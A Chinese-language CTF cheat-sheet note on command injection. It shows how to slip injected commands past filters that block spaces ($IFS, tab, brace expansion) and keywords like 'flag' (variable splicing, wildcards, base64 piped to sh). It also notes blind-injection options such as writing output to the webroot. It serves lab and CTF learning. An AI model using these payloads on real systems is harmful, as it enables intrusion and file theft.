# 命令注入：空格与关键字过滤绕过

**一句话**：命令注入点（`?ip=…` 这类直接拼进 shell 的参数）常带两层过滤——空格被拦、关键字（如 `flag`）被拦。空格用 `$IFS`/`%09` 替，关键字用「变量拼接 / 通配符 / base64」拆开骗过 `preg_match`。

## 触发信号

- URL 参数直接拼进系统命令：`ping`、`traceroute`、`nslookup`、`dig`、`curl` 等。
- `?ip=127.0.0.1|ls` 回显了目录 → 命令注入可用。
- 直接 `cat flag.php` 报错/无回显 → 空格被过滤。
- 读源码发现 `preg_match('/flag/', …)` 之类 → 关键字被过滤。

## 核心套路

**1. 命令分隔符**：`|` `;` `&&` `||` `` ` `` `$()` `%0a`（换行）。

**2. 空格绕过**（空格被 `str_replace(' ','')` 或正则过滤时）：
- `$IFS$9` / `$IFS$1` / `${IFS}` —— shell 的 IFS 默认含空格，`$9` 是空参数，拼起来就是空格；
- `%09`（URL 编码的 tab，若只过滤空格没过滤 tab）；
- `<` / `<>`（重定向，某些上下文可当分隔符）；
- `{cat,flag.php}`（bash brace expansion）。

**3. 关键字绕过**（`flag` 等被 `preg_match` 拦时，本质是让「传给 PHP 的字符串」不含该词、但「shell 执行时」拼出该词）：

```bash
# 变量拼接：a=g，fla$a = flag
?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php

# 通配符
?ip=127.0.0.1;cat$IFS$1fla?.php     # fla? = flag（? 匹配一个字符）

# base64：命令里完全不出现 flag
?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh

# 引号/反斜杠拆分（只对 shell 关键字有效，对 PHP 端过滤要看过滤点）
?ip=127.0.0.1;cat$IFS$1fl""ag.php
```

## 坑

- 过滤点分两处：**PHP 端**（`preg_match` 对输入字符串）和 **shell 端**。PHP 端过滤用「变量拼接/通配符/base64」绕（让输入串不含关键字）；shell 端过滤（如 `bash -c` 里的正则）要另想。
- `%09`（tab）能不能用取决于过滤正则里有没有 `\s`；只 `str_replace(' ','')` 时 `%09` 有效。
- base64 绕过时注意 `$IFS` 本身也可能被过滤，空格和关键字可能要一起绕。
- 注入回显不一定有：无回显时用 `|base64`、`> /var/www/html/x.txt` 落盘再读、或 `curl 外带`（但靶机一般没外网）。

## 关联

- 同类「Web 过滤绕过」：见 `gopher-ssrf.md`。
- 命令注入常和 LFI/文件读取连用（读 `index.php` 拿源码、找过滤规则）。
